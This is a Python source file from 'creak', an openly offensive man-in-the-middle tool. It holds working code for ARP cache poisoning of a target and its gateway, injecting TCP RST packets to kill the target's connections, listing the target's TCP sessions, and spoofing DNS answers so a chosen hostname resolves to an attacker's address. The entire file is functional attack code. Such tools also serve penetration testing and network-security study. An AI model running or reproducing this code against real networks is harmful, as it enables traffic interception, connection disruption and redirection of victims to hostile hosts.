# Copyright (c) 2014-2016 Andrea Baldan
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA

""" Mitm main module, contains classes responsible for the attacks """

import time
import logging as log
from socket import socket, inet_ntoa, gethostbyname, PF_PACKET, SOCK_RAW
from threading import Thread
try:
    from scapy.all import ARP, send, conf
    conf.verb = 0
except ImportError:
    print("[!] Missing module scapy, try setting SCAPY to False in config.py"
          "or install missing module")
try:
    import pcap
    import dpkt
except ImportError:
    print("[!] Missing modules pcap or dpkt, try setting SCAPY to True in config.py"
          "or install missing modules")
try:
    import dnet
except ImportError:
    print("[!] Missing module dnet, DNS spoofing (-2 options) won't work")
import creak.utils as utils
import creak.config as config

(G, W, R) = (utils.G, utils.W, utils.R)

class Mitm(object):
    """
    Base abstract class for Man In The Middle attacks, poison and restore are
    left unimplemented
    """
    def __init__(self, device, source_mac, gateway, target):
        self.dev = device
        self.src_mac = source_mac
        self.gateway = gateway
        self.target = target

    def _build_pcap_filter(self, prefix, port=None):
        """ build the pcap filter based on arguments self.target and port"""
        pcap_filter = prefix
        if isinstance(self.target, list):
            pcap_filter = "(%s " % pcap_filter
            for addr in self.target[:-1]:
                pcap_filter += "%s or " % addr
            pcap_filter += "%s) " % self.target[-1]
        else:
            pcap_filter += "%s" % self.target
        if port:
            pcap_filter += " and tcp port %s" % port

        return pcap_filter

    def rst_inject(self, port=None):
        """
        injecting RESET packets to the target machine eventually blocking his
        connection and navigation
        """
        sock = socket(PF_PACKET, SOCK_RAW)
        sock.bind((self.dev, dpkt.ethernet.ETH_TYPE_ARP))
        pcap_filter = self._build_pcap_filter("ip host ", port)

        # need to create a daemon that continually poison our target
        poison_thread = Thread(target=self.poison, args=(2,))
        poison_thread.daemon = True
        poison_thread.start()
        # start capturing packets
        packets = pcap.pcap(self.dev)
        packets.setfilter(pcap_filter) # we need only target packets

        print('[+] Start poisoning on ' + G + self.dev + W + ' between ' + G + self.gateway + W
              + ' and ' + R
              + (','.join(self.target) if isinstance(self.target, list) else self.target) + W +'\n')

        if port:
            print('[+] Sending RST packets to ' + R
                  + (','.join(self.target) if isinstance(self.target, list) else self.target)
                  + W + ' on port ' + R + port + W)
        else:
            print('[+] Sending RST packets to ' + R
                  + (','.join(self.target) if isinstance(self.target, list) else self.target) + W)

        if config.DOTTED is True:
            print('[+] Every dot symbolize a sent packet')

        counter = 0
        try:
            for _, pkt in packets:
                eth = dpkt.ethernet.Ethernet(pkt)
                ip_packet = eth.data
                if ip_packet.p == dpkt.ip.IP_PROTO_TCP:
                    tcp = ip_packet.data
                    if tcp.flags != dpkt.tcp.TH_RST:
                        # build tcp layer
                        tcp_layer = dpkt.tcp.TCP(
                            sport=tcp.sport,
                            dport=tcp.dport,
                            seq=tcp.seq + len(tcp.data),
                            ack=0,
                            off_x2=0x50,
                            flags=dpkt.tcp.TH_RST,
                            win=tcp.win,
                            sum=0,
                            urp=0)
                        # build ip layer
                        ip_layer = dpkt.ip.IP(
                            v_hl=ip_packet.v_hl,
                            tos=ip_packet.tos,
                            len=40,
                            id=ip_packet.id + 1,
                            off=0x4000,
                            ttl=128,
                            p=ip_packet.p,
                            sum=0,
                            src=ip_packet.src,
                            dst=ip_packet.dst,
                            data=tcp_layer)
                        # build ethernet layer
                        eth_layer = dpkt.ethernet.Ethernet(
                            dst=eth.dst,
                            src=eth.src,
                            type=eth.type,
                            data=ip_layer)

                        sock.send(str(eth_layer))

                        if config.DOTTED is True:
                            utils.print_in_line('.')
                        else:
                            utils.print_counter(counter)

                        # rebuild layers
                        ip_packet.src, ip_packet.dst = ip_packet.dst, ip_packet.src
                        tcp_layer.sport, tcp_layer.dport = tcp.dport, tcp.sport
                        tcp_layer.ack, tcp_layer.seq = tcp.seq + len(tcp.data), tcp.ack
                        eth_layer.src, eth_layer.dst = eth.dst, eth.src

                        sock.send(str(eth_layer))

                        if config.DOTTED is True:
                            utils.print_in_line('.')
                        else:
                            utils.print_counter(counter)
                            counter += 1

        except KeyboardInterrupt:
            print('[+] Rst injection interrupted\n\r')
            sock.close()
            self.restore(2)
            utils.set_ip_forward(0)

    def list_sessions(self, port=None):
        """
        Try to get all TCP sessions of the target
        """
        notorious_services = {
            20: ' ftp-data session',
            21: ' ftp-data session',
            22: ' ssh session',
            23: ' telnet session',
            25: ' SMTP session',
            80: ' HTTP session',
            110: ' POP3 session',
            143: ' IMAP session',
            194: ' IRC session',
            220: ' IMAPv3 session',
            443: ' SSL session',
            445: ' SAMBA session',
            989: ' FTPS session',
            990: ' FTPS session',
            992: ' telnet SSL session',
            993: ' IMAP SSL session',
            994: ' IRC SSL session'
        }

        source = utils.get_default_gateway_linux()
        pcap_filter = self._build_pcap_filter("ip host ", port)
        packets = pcap.pcap(self.dev)
        packets.setfilter(pcap_filter) # we need only self.target packets
        # need to create a daemon that continually poison our target
        poison_thread = Thread(target=self.poison, args=(2,))
        poison_thread.daemon = True
        poison_thread.start()
        print('[+] Start poisoning on ' + G + self.dev + W + ' between ' + G + source + W
              + ' and ' + R
              + (','.join(self.target) if isinstance(self.target, list) else self.target) + W +'\n')
        sessions = {}
        try:
            for _, pkt in packets:
                eth = dpkt.ethernet.Ethernet(pkt)
                ip_packet = eth.data
                if ip_packet.p == dpkt.ip.IP_PROTO_TCP:
                    tcp = ip_packet.data
                    if tcp.flags != dpkt.tcp.TH_RST:
                        sess = "%-25s <-> %25s" % (inet_ntoa(ip_packet.src) + ":"
                                                   + str(tcp.sport), inet_ntoa(ip_packet.dst) + ":"
                                                   + str(tcp.dport))
                        check = False
                        if sess not in sessions:
                            check = True

                        sessions[sess] = "Others"

                        if tcp.sport in notorious_services:
                            sessions[sess] = notorious_services[tcp.sport]
                        elif tcp.dport in notorious_services:
                            sessions[sess] = notorious_services[tcp.dport]

                        if check is True:
                            print(" [{:^5}] {} : {}".format(len(sessions), sess, sessions[sess]))

        except KeyboardInterrupt:
            print('[+] Session scan interrupted\n\r')
            self.restore(2)
            utils.set_ip_forward(0)

    def dns_spoof(self, host=None, redirection=None):
        """
        Redirect all incoming request for 'host' to 'redirection'
        """
        pcap_filter = self._build_pcap_filter('udp dst port 53 and src ')
        redirection = gethostbyname(redirection)
        sock = dnet.ip()

        print('[+] Start poisoning on ' + G + self.dev + W + ' between ' + G + self.gateway + W
              + ' and ' + R
              + (','.join(self.target) if isinstance(self.target, list) else self.target) + W +'\n')
        # need to create a daemon that continually poison our target
        poison_thread = Thread(target=self.poison, args=(2, ))
        poison_thread.daemon = True
        poison_thread.start()

        packets = pcap.pcap(self.dev)
        packets.setfilter(pcap_filter)

        print('[+] Redirecting ' + G + host + W + ' to ' + G + redirection + W + ' for ' + R
              + (','.join(self.target) if isinstance(self.target, list) else self.target) + W)

        try:
            for _, pkt in packets:
                eth = dpkt.ethernet.Ethernet(pkt)
                ip_packet = eth.data
                udp = ip_packet.data
                dns = dpkt.dns.DNS(udp.data)
                # validate query
                if dns.qr != dpkt.dns.DNS_Q:
                    continue
                if dns.opcode != dpkt.dns.DNS_QUERY:
                    continue
                if len(dns.qd) != 1:
                    continue
                if len(dns.an) != 0:
                    continue
                if len(dns.ns) != 0:
                    continue
                if dns.qd[0].cls != dpkt.dns.DNS_IN:
                    continue
                if dns.qd[0].type != dpkt.dns.DNS_A:
                    continue
                # spoof for our target name
                if dns.qd[0].name != host:
                    continue

                # dns query->response
                dns.op = dpkt.dns.DNS_RA
                dns.rcode = dpkt.dns.DNS_RCODE_NOERR
                dns.qr = dpkt.dns.DNS_R

                # construct fake answer
                arr = dpkt.dns.DNS.RR()
                arr.cls, arr.type, arr.name = dpkt.dns.DNS_IN, dpkt.dns.DNS_A, host
                arr.ip = dnet.addr(redirection).ip

                dns.an.append(arr)

                udp.sport, udp.dport = udp.dport, udp.sport
                ip_packet.src, ip_packet.dst = ip_packet.dst, ip_packet.src
                udp.data, udp.ulen = dns, len(udp)
                ip_packet.len = len(ip_packet)

                print(inet_ntoa(ip_packet.src))

                buf = dnet.ip_checksum(str(ip_packet))
                sock.send(buf)

        except KeyboardInterrupt:
            print('[+] DNS spoofing interrupted\n\r')
            self.restore(2)
            utils.set_ip_forward(0)

    def poison(self, delay):
        """
        Poison arp cache of target and router, causing all traffic between them to
        pass inside our machine, MITM heart
        """
        raise NotImplementedError("not implemented")

    def restore(self, delay):
        """ reset arp cache of the target and the router (AP) """
        raise NotImplementedError("not implemented")

class PcapMitm(Mitm):
    """
    Man In The Middle subclass using raw sockets to poison the targets
    """
    def __init__(self, device, source_mac, gateway, target):
        super(PcapMitm, self).__init__(device, source_mac, gateway, target)

    def poison(self, delay):
        """
        poison arp cache of target and router, causing all traffic between them to
        pass inside our machine, MITM heart
        """
        utils.set_ip_forward(1)
        sock = socket(PF_PACKET, SOCK_RAW)
        sock.bind((self.dev, dpkt.ethernet.ETH_TYPE_ARP))
        try:
            while True:
                if config.VERBOSE is True:
                    log.info('[+] %s <-- %s -- %s -- %s --> %s',
                             self.gateway, self.target, self.dev, self.gateway, self.target)
                    if not isinstance(self.target, list):
                        sock.send(str(utils.build_arp_packet(
                            self.src_mac, self.gateway, self.target)))
                        sock.send(str(utils.build_arp_packet(
                            self.src_mac, self.target, self.gateway)))
                        time.sleep(delay) # OS refresh ARP cache really often
                    else:
                        for addr in self.target:
                            sock.send(str(utils.build_arp_packet(self.src_mac, self.gateway, addr)))
                            sock.send(str(utils.build_arp_packet(self.src_mac, addr, self.gateway)))
                        time.sleep(delay) # OS refresh ARP cache really often

        except KeyboardInterrupt:
            print('\n\r[+] Poisoning interrupted')
            sock.close()

    def restore(self, delay):
        """ reset arp cache of the target and the router (AP) """
        source_mac = utils.get_mac_by_ip(self.gateway)
        sock = socket(PF_PACKET, SOCK_RAW)
        sock.bind((self.dev, dpkt.ethernet.ETH_TYPE_ARP))
        if not isinstance(self.target, list):
            target_mac = utils.get_mac_by_ip(self.target)
            for _ in xrange(6):
                sock.send(str(utils.build_arp_packet(target_mac, self.gateway, self.target)))
                sock.send(str(utils.build_arp_packet(source_mac, self.target, self.gateway)))
        else:
            for addr in self.target:
                target_mac = utils.get_mac_by_ip(addr)
                for _ in xrange(6):
                    sock.send(str(utils.build_arp_packet(target_mac, self.gateway, addr)))
                    sock.send(str(utils.build_arp_packet(source_mac, addr, self.gateway)))

class ScapyMitm(Mitm):
    """
    Man In The Middle subclass using scapy to poison the target, needs tcpdump to be
    installed
    """
    def __init__(self, device, source_mac, gateway, target):
        super(ScapyMitm, self).__init__(device, source_mac, gateway, target)

    def poison(self, delay):
        if not isinstance(self.target, list):
            dst_mac = utils.get_mac_by_ip_s(self.target, delay)
            send(ARP(op=2, pdst=self.target, psrc=self.gateway, hwdst=dst_mac), verbose=False)
            send(ARP(op=2, pdst=self.gateway, psrc=self.target, hwdst=self.src_mac), verbose=False)
        else:
            for addr in self.target:
                dst_mac = utils.get_mac_by_ip_s(addr, delay)
                send(ARP(op=2, pdst=addr, psrc=self.gateway, hwdst=dst_mac), verbose=False)
                send(ARP(op=2, pdst=self.gateway, psrc=addr, hwdst=self.src_mac), verbose=False)

    def restore(self, delay):
        if not isinstance(self.target, list):
            dst_mac = utils.get_mac_by_ip_s(self.target, delay)
            send(ARP(op=2, pdst=self.gateway, psrc=self.target,
                     hwdst="ff:" * 5 + "ff", hwsrc=dst_mac), count=3, verbose=False)
            send(ARP(op=2, pdst=self.target, psrc=self.gateway,
                     hwdst="ff:" * 5 + "ff", hwsrc=self.src_mac), count=3, verbose=False)
        else:
            for addr in self.target:
                dst_mac = utils.get_mac_by_ip_s(addr, delay)
                send(ARP(op=2, pdst=self.gateway, psrc=addr,
                         hwdst="ff:" * 5 + "ff", hwsrc=dst_mac), count=3, verbose=False)
                send(ARP(op=2, pdst=addr, psrc=self.gateway,
                         hwdst="ff:" * 5 + "ff", hwsrc=self.src_mac), count=3, verbose=False)
